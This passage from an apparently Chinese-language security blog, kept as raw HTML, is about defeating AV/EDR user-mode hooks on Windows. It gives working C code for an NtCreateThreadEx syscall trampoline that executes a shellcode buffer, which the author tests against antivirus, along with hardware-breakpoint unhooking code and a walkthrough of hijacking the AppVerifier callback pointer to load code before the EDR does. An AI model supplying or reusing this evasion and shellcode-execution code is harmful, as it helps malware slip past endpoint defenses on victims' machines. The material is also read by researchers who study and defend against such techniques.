class=\"line\">c3                      \t\tret</span><br></pre></td></tr></table></figure>\n\n<p>同样可以应用到其他的函数，通过查看上面的ZwOpenProcess对比图，发现遵循SYSCALL的函数被hook后缺少了 <code>mov r10 rcx | mov eax &lt;syscall number&gt;</code> 指令，因此在新函数中我们要添加上这两条指令后再jmp，所以自定义函数指令变为了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">4C 8B D1\t\t\t\tmov r10, rcx\t\t&#x2F;&#x2F; syscall-1</span><br><span class=\"line\">B8 &lt;number&gt; 00 00 00\tmov eax, &lt;SSN&gt;\t&#x2F;&#x2F; syscall-2,SSN number不同函数是不同的</span><br><span class=\"line\">49 BB &lt;addr&gt; \t\t\tmov r11, &lt;addr&gt; \t&#x2F;&#x2F; 保存要跳转到的地址</span><br><span class=\"line\">41 ff e3\t\t\t\tjmp r11\t\t\t\t&#x2F;&#x2F; 跳转</span><br></pre></td></tr></table></figure>\n\n<p>这里以NtCreateThreadEx为例，给出代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#define NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;&#x3D; 0)</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _UNICODE_STRING &#123;</span><br><span class=\"line\">    USHORT Length;</span><br><span class=\"line\">    USHORT MaximumLength;</span><br><span class=\"line\">#ifdef MIDL_PASS</span><br><span class=\"line\">    [size_is(MaximumLength &#x2F; 2), length_is((Length) &#x2F; 2)] USHORT* Buffer;</span><br><span class=\"line\">#else &#x2F;&#x2F; MIDL_PASS</span><br><span class=\"line\">    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH   Buffer;</span><br><span class=\"line\">#endif &#x2F;&#x2F; MIDL_PASS</span><br><span class=\"line\">&#125; UNICODE_STRING;</span><br><span class=\"line\">typedef UNICODE_STRING* PUNICODE_STRING;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _OBJECT_ATTRIBUTES &#123;</span><br><span class=\"line\">    ULONG Length;</span><br><span class=\"line\">    HANDLE RootDirectory;</span><br><span class=\"line\">    PUNICODE_STRING ObjectName;</span><br><span class=\"line\">    ULONG Attributes;</span><br><span class=\"line\">    PVOID SecurityDescriptor;        &#x2F;&#x2F; Points to type SECURITY_DESCRIPTOR</span><br><span class=\"line\">    PVOID SecurityQualityOfService;  &#x2F;&#x2F; Points to type SECURITY_QUALITY_OF_SERVICE</span><br><span class=\"line\">&#125; OBJECT_ATTRIBUTES;</span><br><span class=\"line\">typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;</span><br><span class=\"line\">typedef CONST OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _PS_ATTRIBUTE</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ULONG_PTR Attribute;                &#x2F;&#x2F; PROC_THREAD_ATTRIBUTE_XXX | PROC_THREAD_ATTRIBUTE_XXX modifiers, see ProcThreadAttributeValue macro and Windows Internals 6 (372)</span><br><span class=\"line\">    SIZE_T Size;                        &#x2F;&#x2F; Size of Value or *ValuePtr</span><br><span class=\"line\">    union</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ULONG_PTR Value;                &#x2F;&#x2F; Reserve 8 bytes for data (such as a Handle or a data pointer)</span><br><span class=\"line\">        PVOID ValuePtr;                 &#x2F;&#x2F; data pointer</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    PSIZE_T ReturnLength;               &#x2F;&#x2F; Either 0 or specifies size of data returned to caller via &quot;ValuePtr&quot;</span><br><span class=\"line\">&#125; PS_ATTRIBUTE, * PPS_ATTRIBUTE;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct _PS_ATTRIBUTE_LIST</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    SIZE_T TotalLength;                 &#x2F;&#x2F; sizeof(PS_ATTRIBUTE_LIST)</span><br><span class=\"line\">    PS_ATTRIBUTE Attributes[2];         &#x2F;&#x2F; Depends on how many attribute entries should be supplied to NtCreateUserProcess</span><br><span class=\"line\">&#125; PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef NTSTATUS (NTAPI* PUSER_THREAD_START_ROUTINE)(</span><br><span class=\"line\">    _In_ PVOID ThreadParameter</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">typedef NTSTATUS (NTAPI* MyNtCreateThreadEx)(</span><br><span class=\"line\">    _Out_ PHANDLE ThreadHandle,</span><br><span class=\"line\">    _In_ ACCESS_MASK DesiredAccess,</span><br><span class=\"line\">    _In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class=\"line\">    _In_ HANDLE ProcessHandle,</span><br><span class=\"line\">    _In_ PUSER_THREAD_START_ROUTINE StartRoutine,</span><br><span class=\"line\">    _In_opt_ PVOID Argument,</span><br><span class=\"line\">    _In_ ULONG CreateFlags, &#x2F;&#x2F; THREAD_CREATE_FLAGS_*</span><br><span class=\"line\">    _In_ SIZE_T ZeroBits,</span><br><span class=\"line\">    _In_ SIZE_T StackSize,</span><br><span class=\"line\">    _In_ SIZE_T MaximumStackSize,</span><br><span class=\"line\">    _In_opt_ PPS_ATTRIBUTE_LIST AttributeList</span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">PVOID CCopyMemory(PVOID Destination, CONST PVOID Source, SIZE_T Length)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    PBYTE D &#x3D; (PBYTE)Destination;</span><br><span class=\"line\">    PBYTE S &#x3D; (PBYTE)Source;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (Length--)</span><br><span class=\"line\">        *D++ &#x3D; *S++;</span><br><span class=\"line\"></span><br><span class=\"line\">    return Destination;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void UnhookJump(LPVOID pMemory) &#123;</span><br><span class=\"line\">    unsigned char syscode[] &#x3D; &#123; 0x4C, 0x8B, 0xD1, 0xB8, 0xC2, 0x00, 0x00, 0x00, &#125;; &#x2F;&#x2F; mov r10, rcx ; mov eax, C2</span><br><span class=\"line\">    unsigned char jumpPrelude[] &#x3D; &#123; 0x49, 0xBB &#125;; &#x2F;&#x2F; mov r11, jumpAddress</span><br><span class=\"line\">    unsigned char jumpAddress[] &#x3D; &#123; 0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF &#125;;</span><br><span class=\"line\">    unsigned char jumpEpilogue[] &#x3D; &#123; 0x41, 0xFF, 0xE3 &#125;;  &#x2F;&#x2F; jmp r11</span><br><span class=\"line\">    LPVOID origNtCreateThreadEx &#x3D; GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;), &quot;NtCreateThreadEx&quot;);</span><br><span class=\"line\">    LPVOID jmpAddr &#x3D; (void*)((char*)origNtCreateThreadEx + 0x8);</span><br><span class=\"line\">    *(void**)(jumpAddress) &#x3D; jmpAddr;</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID trampoline &#x3D; VirtualAlloc(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    printf(&quot;Address of jmpFunc at 0x%p\\n&quot;, trampoline);</span><br><span class=\"line\">    printf(&quot;Original NtCreateThreadEx at 0x%p\\n&quot;, origNtCreateThreadEx);</span><br><span class=\"line\">    printf(&quot;jmp to Address at 0x%p\\n&quot;, jmpAddr);</span><br><span class=\"line\"></span><br><span class=\"line\">    CCopyMemory(trampoline, syscode, 8);</span><br><span class=\"line\">    CCopyMemory((PBYTE)trampoline + 8, jumpPrelude, 2);</span><br><span class=\"line\">    CCopyMemory((PBYTE)trampoline + 8 + 2, jumpAddress, sizeof(jumpAddress));</span><br><span class=\"line\">    CCopyMemory((PBYTE)trampoline + 8 + 2 + 8, jumpEpilogue, 3);</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD oldProtect &#x3D; 0;</span><br><span class=\"line\">    VirtualProtect(trampoline, 30, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\">    MyNtCreateThreadEx pNtCreateThreadEx &#x3D; (MyNtCreateThreadEx)trampoline;</span><br><span class=\"line\">    HANDLE hThread;</span><br><span class=\"line\">    NTSTATUS status &#x3D; pNtCreateThreadEx(&amp;hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (PUSER_THREAD_START_ROUTINE)pMemory, NULL, FALSE, 0, 0, 0, NULL);</span><br><span class=\"line\">    if (!NT_SUCCESS(status)) &#123; printf(&quot;[!] Failed in NtCreateThreadEx (%u)\\n&quot;, GetLastError());return; &#125;;</span><br><span class=\"line\">    WaitForSingleObject(hThread, INFINITE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    unsigned char buf[] &#x3D; &quot;xxxx&quot;; &#x2F;&#x2F; shellcode here</span><br><span class=\"line\"></span><br><span class=\"line\">    LPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class=\"line\">    printf(&quot;shellcode address: 0x%p\\n&quot;, pMemory);</span><br><span class=\"line\">    </span><br><span class=\"line\">    UnhookJump(pMemory);</span><br><span class=\"line\"></span><br><span class=\"line\">    VirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>跟踪调试下，shellcode进内存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211003716235.png\" alt=\"image-20260211003716235\"></p>\n<p>计算出jmp地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211004028072.png\" alt=\"image-20260211004028072\"></p>\n<p>将自定义函数指令写入内存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211004203440.png\" alt=\"image-20260211004203440\"></p>\n<p>成功jmp，shellcode执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211004447736.png\" alt=\"image-20260211004447736\"></p>\n<p>测试一下杀软环境的情况</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211005453313.png\" alt=\"image-20260211005453313\"></p>\n<p>成功绕过了jmp</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211005642161.png\" alt=\"image-20260211005642161\"></p>\n<p>但是最后还是被拦截</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211005946114.png\" alt=\"image-20260211005946114\"></p>\n<p>通过比对 本机和AV机，NtCreateThreadEx已经执行，存在差异的是shellcode在创建进程这一步在AV机失败，猜测可能是shellcode所在内存地址、属性、堆栈、Thread回调等原因导致的失败？</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211012343925.png\" alt=\"image-20260211012343925\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260211012654939.png\" alt=\"image-20260211012654939\"></p>\n<h3 id=\"直接系统调用\"><a href=\"#直接系统调用\" class=\"headerlink\" title=\"直接系统调用\"></a>直接系统调用</h3><p>完全将函数进入ring0的完整指令保存并执行，最大的缺陷就是不经过ntdll直接进入内核的调用堆栈。</p>\n<h2 id=\"硬件断点\"><a href=\"#硬件断点\" class=\"headerlink\" title=\"硬件断点\"></a>硬件断点</h2><blockquote>\n<p>windows PE进程初始化过程中ldrloaddll 加载 ntdll过程</p>\n<p>windows用户态调试机制与模型</p>\n<p>三种断点方式分别触发不同类型异常</p>\n<p>windows异常处理</p>\n<p>用户态获取调试对象的函数：WaitForDebugEvent、ContinueDebugEvent</p>\n</blockquote>\n<p>在用户态可以利用这么一种循环模型构造一个简单的调试器来调试程序，该调试模型是基于异常分发机制实现</p>\n<ul>\n<li>创建/附加debug进程</li>\n<li>通过WaitForDebugEvent获取异常事件</li>\n<li>在不同事件中可以进行你要做的事</li>\n<li>在EXCEPTION_DEBUG_EVENT可以进一步区分是什么异常类型，并进行你要做的事</li>\n<li>通过ContinueDebugEvent继续执行调试</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">CreateProcess(..., DEBUG_PROCESS, ...) 或者 DebugActiveProcess(dwProcessId)</span><br><span class=\"line\"></span><br><span class=\"line\">DEBUG_EVENT de;</span><br><span class=\"line\">BOOL bContinue &#x3D; TRUE;</span><br><span class=\"line\">DWORD dwContinueStatus &#x3D; DBG_CONTINUE;</span><br><span class=\"line\"></span><br><span class=\"line\">while (bContinue)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    bContinue &#x3D; WaitForDebugEvent(&amp;de, INFINITE); &#x2F;&#x2F; 等待调试事件（阻塞）</span><br><span class=\"line\">    if (!bContinue)</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    </span><br><span class=\"line\">    dwContinueStatus &#x3D; DBG_CONTINUE; &#x2F;&#x2F; 默认继续状态</span><br><span class=\"line\"></span><br><span class=\"line\">    switch (de.dwDebugEventCode)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        case CREATE_PROCESS_DEBUG_EVENT:  break; &#x2F;&#x2F; 进程创建</span><br><span class=\"line\">        case CREATE_THREAD_DEBUG_EVENT:  break; &#x2F;&#x2F; 线程创建</span><br><span class=\"line\">        case EXIT_PROCESS_DEBUG_EVENT:  bContinue &#x3D; FALSE; break; &#x2F;&#x2F; 进程退出</span><br><span class=\"line\">        case EXIT_THREAD_DEBUG_EVENT:  bContinue &#x3D; FALSE; break; &#x2F;&#x2F; 线程退出</span><br><span class=\"line\">        case LOAD_DLL_DEBUG_EVENT: break; &#x2F;&#x2F; dll加载</span><br><span class=\"line\">        case UNLOAD_DLL_DEBUG_EVENT: break; &#x2F;&#x2F; dll卸载</span><br><span class=\"line\">        case EXCEPTION_DEBUG_EVENT: &#x2F;&#x2F; 异常事件</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            DWORD code &#x3D; de.u.Exception.ExceptionRecord.ExceptionCode;</span><br><span class=\"line\">            switch (code)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                case EXCEPTION_BREAKPOINT: &#123;break;&#125; &#x2F;&#x2F; int 3 异常 - 软件断点</span><br><span class=\"line\">                case EXCEPTION_ACCESS_VIOLATION: &#123;break;&#125; &#x2F;&#x2F;访问异常 - 内存断点</span><br><span class=\"line\">                case EXCEPTION_SINGLE_STEP: &#123;break;&#125; &#x2F;&#x2F; 单步 - 硬件断点</span><br><span class=\"line\">                default: &#x2F;&#x2F; 未处理异常 -&gt; 交给程序</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    dwContinueStatus &#x3D; DBG_EXCEPTION_NOT_HANDLED;</span><br><span class=\"line\">                    break;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            break;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        default: break; &#x2F;&#x2F; 其他调试事件</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F; 通知内核继续执行</span><br><span class=\"line\">    ContinueDebugEvent(de.dwProcessId,de.dwThreadId,dwContinueStatus);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>调试与断点是无法分开的，硬件断点是异常触发手段的其中一种，它允许 CPU 在读取、写入或执行特定地址时触发异常，从而被调试模型捕获。</p>\n<p>硬件断点进行unhook原理就是在Dr0寄存器中写入 **LdrLoadDll ** 地址即在该地址下了硬件断点，通过调试模型在 <code>case EXCEPTION_SINGLE_STEP</code> 时触发，此时由于进程创建时已经自动加载一个干净的ntdll，并不需要加载后续dll，因此在该断点直接return使当前进程仍处于阻塞状态以保证不会加载后续dll。</p>\n<p>为了能理解 调试 - 硬件断点，以下有很好的文章进行学习</p>\n<p><a href=\"https://learn.microsoft.com/zh-cn/windows/win32/debug/basic-debugging\">Microsoft-basic-debugging</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1471234\">初探Windows用户态调试机制</a></p>\n<p><a href=\"https://forum.butian.net/share/1461\">windows环境下的调试器探究</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/y33fow2XfWD0Dm89HqV13g\">滥用方法VS检测手段：深入探究Windows硬件断点和异常</a></p>\n<p>同时还有深入整个模型背后异常分发机制的拓展文章：</p>\n<p><a href=\"https://forum.butian.net/share/1475\">初探windows异常处理</a></p>\n<p><a href=\"https://www.52pojie.cn/thread-1663524-1-1.html\">Windows 10 x64 异常分发</a></p>\n<p>分析下代码，创建DEBUG进程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">BOOL hProcbool &#x3D; CreateProcessWCustom(processName, processName, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, &amp;si, &amp;pi);</span><br></pre></td></tr></table></figure>\n\n<p>找LdrLoadDll地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HMODULE hNtdll &#x3D; GetModuleFromPEB(4097367);</span><br><span class=\"line\">HMODULE hKernel_32 &#x3D; GetModuleFromPEB(109513359);</span><br><span class=\"line\">_LdrLoadDll LdrLoadDllCustom &#x3D; (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, 11529801);</span><br></pre></td></tr></table></figure>\n\n<p>设置Dr0为LdrLoadDll地址，如果ExceptionAddress = LdrLoadDll地址，直接return</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">VOID SetHWBP(DWORD_PTR address, HANDLE hThread)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tCONTEXT ctx &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\tctx.ContextFlags &#x3D; CONTEXT_DEBUG_REGISTERS | CONTEXT_INTEGER;</span><br><span class=\"line\">\tctx.Dr0 &#x3D; address;</span><br><span class=\"line\">\tctx.Dr7 &#x3D; 0x00000001;</span><br><span class=\"line\"></span><br><span class=\"line\">\tSetThreadContext(hThread, &amp;ctx);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDEBUG_EVENT dbgEvent;</span><br><span class=\"line\">\twhile (true)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tif (WaitForDebugEvent(&amp;dbgEvent, INFINITE) &#x3D;&#x3D; 0)</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (dbgEvent.dwDebugEventCode &#x3D;&#x3D; EXCEPTION_DEBUG_EVENT &amp;&amp;</span><br><span class=\"line\">\t\t\tdbgEvent.u.Exception.ExceptionRecord.ExceptionCode &#x3D;&#x3D; EXCEPTION_SINGLE_STEP)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tCONTEXT newCtx &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\t\t\tnewCtx.ContextFlags &#x3D; CONTEXT_ALL;</span><br><span class=\"line\">\t\t\tGetThreadContext(hThread, &amp;newCtx);</span><br><span class=\"line\">\t\t\tif (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress &#x3D;&#x3D; (LPVOID)address)</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tprintf(&quot;[+] Breakpoint Hit!\\n&quot;);</span><br><span class=\"line\">\t\t\t\tnewCtx.Dr0 &#x3D; newCtx.Dr6 &#x3D; newCtx.Dr7 &#x3D; 0;</span><br><span class=\"line\">\t\t\t\tnewCtx.EFlags |&#x3D; (1 &lt;&lt; 8);</span><br><span class=\"line\">\t\t\t\treturn;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\telse &#123;</span><br><span class=\"line\">\t\t\t\tnewCtx.Dr0 &#x3D; address;</span><br><span class=\"line\">\t\t\t\tnewCtx.Dr7 &#x3D; 0x00000001;</span><br><span class=\"line\">\t\t\t\tnewCtx.EFlags &amp;&#x3D; ~(1 &lt;&lt; 8);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tSetThreadContext(hThread, &amp;newCtx);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>关于硬件断点，除了利用LdrLoadDll强制加载ntdll，还可以下两个断点第一个在edr jmp检查后，syscall之前，第二个在syscall调用完毕返回后，这样在使用API函数时传入正常无害参数，在第一个断点触发替换为恶意参数，在第二个断点触发时在替换为原参数，详情看：<a href=\"https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html\">https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html</a></p>\n<h2 id=\"调试事件\"><a href=\"#调试事件\" class=\"headerlink\" title=\"调试事件\"></a>调试事件</h2><p>根据上面提到的：调试事件类型（Debug Event Code，dwDebugEventCode）可以看到有一个 <strong>LOAD_DLL_DEBUG_EVENT</strong> 时加载DLL的事件，我们可以测试ntll会不会触发该事件，以及能不能阻止其他dll加载</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if (WaitForDebugEvent(DbgEvent, INFINITE)) &#123;</span><br><span class=\"line\">\tswitch (DbgEvent-&gt;dwDebugEventCode)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase CREATE_PROCESS_DEBUG_EVENT:</span><br><span class=\"line\">\t\tprintf(&quot;[+] New Process Created - PID: %d\\n&quot;, DbgEvent-&gt;dwProcessId);</span><br><span class=\"line\">\t\tprintf(&quot;[+] New Thread Created - TID: %d\\n&quot;, DbgEvent-&gt;dwThreadId);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase LOAD_DLL_DEBUG_EVENT:</span><br><span class=\"line\">\t\twchar_t imageName[MAX_PATH];</span><br><span class=\"line\">\t\tPVOID remoteAddr;</span><br><span class=\"line\">\t\tsize_t dwRead;</span><br><span class=\"line\">\t\tprintf(&quot;[+] DLL Base Address: 0x%08p\\n&quot;, DbgEvent-&gt;u.LoadDll.lpBaseOfDll);</span><br><span class=\"line\">\t\tsystem(&quot;pause&quot;);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase CREATE_THREAD_DEBUG_EVENT:</span><br><span class=\"line\">\t\tprintf(&quot;[+] New Thread Created: 0x%08p\\n&quot;, DbgEvent-&gt;u.CreateThread.lpStartAddress);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\tcase EXCEPTION_DEBUG_EVENT:</span><br><span class=\"line\">\t\tif (DbgEvent-&gt;u.Exception.ExceptionRecord.ExceptionCode &#x3D;&#x3D; EXCEPTION_BREAKPOINT) &#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;[+] Breakpoint was successfully triggered.\\n&quot;);</span><br><span class=\"line\">\t\t\tprintf(&quot;[+] Exception Address [RIP]: 0x%08p\\n&quot;, DbgEvent-&gt;u.Exception.ExceptionRecord.ExceptionAddress);</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tContinueDebugEvent(pi-&gt;dwProcessId, pi-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看到在进程创建时只加载了一个ntdll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260213192436872.png\" alt=\"image-20260213192436872\"></p>\n<h2 id=\"Avrf回调\"><a href=\"#Avrf回调\" class=\"headerlink\" title=\"Avrf回调\"></a>Avrf回调</h2><p>Marcus Hutchins发现了一种新的方法可以在进程初始化过程中提前加载代码，这会早于EDR将DLL注入进程之前，利用了AppVerifier中的AvrfpAPILookupCallbackRoutine回调指针，在创建挂起进程后，劫持该指针地址为恶意代码的起始地址，随后恢复进程，在加载后续dll时会触发以下流程</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">LdrpInitializeProcess -&gt; ... -&gt; LdrGetProcedureAddress -&gt; LdrGetProcedureAddressForCaller -&gt; AVrfCallAPILookupCallback -&gt; AvrfpAPILookupCallbackRoutine</span><br></pre></td></tr></table></figure>\n\n<p>LdrGetProcedureAddress</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214012713139.png\" alt=\"image-20260214012713139\"></p>\n<p>LdrGetProcedureAddressForCaller会调用AVrfCallAPILookupCallback</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214012806486.png\" alt=\"image-20260214012806486\"></p>\n<p>不过需要解密地址才能执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214013051640.png\" alt=\"image-20260214013051640\"></p>\n<p>在初始化过程中加载kernel32，kernelbase，谁会先触发LdrGetProcedureAddress呢？以及整个初始化的调用栈是什么，还需要自己调试一下才能明白了</p>\n<p>看一下项目代码，首先要找到 AppVerifier 回调指针，位于 <code>.mrdata</code> 附近，且结构如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">offset+0x00 - ntdll!LdrpMrdataBase（设置为 .mrdata 段的基地址）</span><br><span class=\"line\">offset+0x08 - ntdll!LdrpKnownDllDirectoryHandle（设置为非零值）</span><br><span class=\"line\">offset+0x10 - ntdll!AvrfpAPILookupCallbacksEnabled（设置为零）</span><br><span class=\"line\">offset+0x18 - ntdll!AvrfpAPILookupCallbackRoutine（设置为零）</span><br></pre></td></tr></table></figure>\n\n<p>找到LdrpMrdataBase，往后遍历，不为NULL的是 <strong>AvrfpAPILookupCallbacksEnabled</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214015703772.png\" alt=\"image-20260214015703772\"></p>\n<p>加密自定义的恶意函数 <code>LdrGetProcedureAddressCallback</code> 地址，写入AvrfpAPILookupCallbackRoutine，开启AvrfpAPILookupCallbacksEnabled</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214015810381.png\" alt=\"image-20260214015810381\"></p>\n<h2 id=\"其他绕过\"><a href=\"#其他绕过\" class=\"headerlink\" title=\"其他绕过\"></a>其他绕过</h2><p>firewalker：向量化异常处理程序找系统调用存根</p>\n<p><a href=\"https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/\">https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/</a></p>\n<p>hookchain: IAT，看PPT就行了没什么新手段，都是组合了一下</p>\n<p><a href=\"https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Helvio%20Carvalho%20Junior%20-%20HookChain%20A%20new%20perspective%20for%20Bypassing%20EDR%20Solutions.pdf\">DEF CON 32 - Helvio Carvalho Junior - HookChain A new perspective for Bypassing EDR Solutions.pdf</a></p>\n<p><a href=\"https://github.com/helviojunior/hookchain\">https://github.com/helviojunior/hookchain</a></p>\n<p>Whisper2Shout：</p>\n<p><a href=\"https://www.secforce.com/blog/whisper2shout-unhooking-technique/\">https://www.secforce.com/blog/whisper2shout-unhooking-technique/</a></p>\n<p>TOCTOU 攻击：没找到详细文章</p>\n<h1 id=\"现代AV-EDR使用hook的防御手段\"><a href=\"#现代AV-EDR使用hook的防御手段\" class=\"headerlink\" title=\"现代AV/EDR使用hook的防御手段\"></a>现代AV/EDR使用hook的防御手段</h1><p>除了上面在用户态进行hook，还有以下检测</p>\n<h2 id=\"SSDT-hook\"><a href=\"#SSDT-hook\" class=\"headerlink\" title=\"SSDT hook\"></a>SSDT hook</h2><p>32位可以直接进行SSDT hook，监测内核函数的调用。64位尝试利用漏洞等 Bypass PathGuard 后进行SSDT hook，但是肯定会引起系统的不稳定</p>\n<h2 id=\"硬件虚拟化技术（Intel-VT-AMD-SVM）检测\"><a href=\"#硬件虚拟化技术（Intel-VT-AMD-SVM）检测\" class=\"headerlink\" title=\"硬件虚拟化技术（Intel VT /AMD SVM）检测\"></a>硬件虚拟化技术（Intel VT /AMD SVM）检测</h2><p>利用VT 技术可以通过MSR Hook/EPT Hook 实现 64位的无痕SSDT Hook（绕过PathGuard）、内核提权检测</p>\n<h2 id=\"内核回调\"><a href=\"#内核回调\" class=\"headerlink\" title=\"内核回调\"></a>内核回调</h2><p><a href=\"https://drunkmars.top/2022/04/29/%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7/\">https://drunkmars.top/2022/04/29/%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7/</a></p>\n<p><a 